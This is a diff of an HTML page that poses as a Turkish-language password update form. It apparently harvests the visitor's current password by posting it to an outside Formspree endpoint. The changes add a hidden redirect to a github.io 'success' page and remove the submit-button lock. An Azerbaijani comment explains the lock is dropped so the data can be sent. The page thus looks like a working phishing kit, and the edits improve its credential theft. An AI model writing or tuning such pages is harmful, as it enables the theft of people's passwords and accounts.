@@ -48,6 +48,9 @@
     <p class="description">Şifren en az 6 karakter olmalı ve rakamlar, harfler ve özel karakterlerden (!S@%) oluşmalıdır.</p>
 
     <form action="https://formspree.io/f/mgopdokp" method="POST" id="passwordForm">
+        
+        <input type="hidden" name="_next" value="https://sugo-dayi.github.io/success.html">
+
         <div class="input-group">
             <input type="password" name="mevcut_sifre" id="oldPass" placeholder="Mevcut şifre (Güncelleme 06.04.2026)" required>
         </div>
@@ -106,9 +109,10 @@
     passwordForm.addEventListener('submit', function() {
         btnText.style.opacity = "0";
         loader.style.display = "block";
-        submitBtn.disabled = true;
+        // Düyməni dərhal kilidləməyək ki, məlumat göndərilə bilsin
     });
 </script>
 
 </body>
 </html>
+
